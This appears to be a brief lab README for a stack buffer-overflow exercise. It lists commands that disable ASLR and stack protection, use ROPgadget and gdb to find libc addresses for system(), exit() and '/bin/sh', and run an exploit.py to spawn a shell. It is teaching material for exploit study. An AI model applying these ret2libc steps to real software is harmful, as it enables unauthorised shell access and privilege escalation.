## To compile the overflow.c: ##
	$ su root
	$ sysctl -w kernel.randomize_va_space=0
	$ gcc -g -fno-stack-protector overflow.c -o overflow

---
## To find the address of pop_pop_ret && system() && setregid() && exit() && "/bin/sh" in exploit.py: ##
	$ ROPgadget --binary ./overflow | grep pop	
	$ gdb ./overflow
	$ b main 
	$ run 
	$ p system
	$ p exit
	$ info proc map
	$ find libc_start_address,libc_end_address,"/bin/sh"

---
## To get the shell: ##
	./overflow $(python exploit.py)
